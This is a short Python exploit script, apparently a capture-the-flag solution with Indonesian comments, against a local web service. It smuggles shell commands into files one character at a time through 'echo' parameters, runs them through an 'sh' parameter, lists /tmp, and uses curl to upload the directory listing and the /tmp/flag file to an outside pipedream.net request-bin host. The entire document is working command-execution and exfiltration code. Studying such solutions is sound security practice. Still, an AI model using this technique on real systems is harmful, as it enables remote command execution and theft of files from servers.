import requests
URL = "http://127.0.0.1:4000/"
REQ_BIN = "https://e34783f22b1eed8fcdbab770ab1a774e.m.pipedream.net"
PAYLOAD_LIST_DIR = "ls /tmp > p"
PAYLOAD_SEND_REQ = "curl -F data=@p {}".format(REQ_BIN)
OUTPUT_LIST_DIR_PAYLOAD = ">>p"
OUTPUT_REQBIN = ">>r"


def getReq(data):
    r = requests.get(URL, data)
    return r


def runCmd(file_name):
    return getReq({
        "sh": file_name,
    })


def reset():
    return getReq({
        "reset": 1,
    })


def savePayloadToFile(payload, file):
    for char in payload:
        r = getReq({
            "echo": char,
            "echo1": file,
        })

reset()
# Cari Directory flag
savePayloadToFile(PAYLOAD_LIST_DIR, OUTPUT_LIST_DIR_PAYLOAD)
runCmd('p')

# Kirim hasil ke reqbin
savePayloadToFile(PAYLOAD_SEND_REQ, OUTPUT_REQBIN)
runCmd('r')

# Flag ditemukan di directory /tmp/flag, kirim file flag melalui reqbin
reset()

PAYLOAD_SEND_FLAG = "curl -F data=@/tmp/flag {}".format(REQ_BIN)
savePayloadToFile(PAYLOAD_SEND_FLAG, OUTPUT_REQBIN)

runCmd('r')